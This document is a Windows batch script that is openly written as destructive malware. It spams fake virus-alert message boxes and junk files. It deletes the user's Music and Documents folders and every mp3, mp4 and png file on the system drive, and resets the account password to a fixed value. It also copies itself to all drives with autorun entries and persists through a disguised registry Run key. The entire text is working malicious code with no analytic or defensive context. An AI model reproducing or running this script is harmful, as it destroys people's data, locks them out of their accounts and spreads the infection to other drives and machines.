@ echo off
rem ---------------------------------
rem Spam With VBScript Msgboxes
echo Do>>msgbox.vbs
echo x=msgbox("Your computer is infected with a virus!",0+48,"Infected") >>msgbox.vbs
echo Loop>>msgbox.vbs
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
rem ---------------------------------
rem ---------------------------------
rem Spam Local Disk
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
rem ---------------------------------
rem ---------------------------------
rem Delete My Music
del /f /q '%userprofile%\My Music\*.*'
rem ---------------------------------
rem ---------------------------------
rem Delete My Documents
del /f /q '%userprofile%\My Documents\*.*'
rem ---------------------------------
rem ---------------------------------
rem Change User Password To DELmE
net user %username% DELmE
rem ---------------------------------
rem ---------------------------------
rem Infect All Drives
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
rem ---------------------------------
rem ---------------------------------
rem Infect Reg Run Key
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
rem ---------------------------------
rem ---------------------------------
rem Delete All Mp3
DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Mp4
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Png
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
rem ---------------------------------
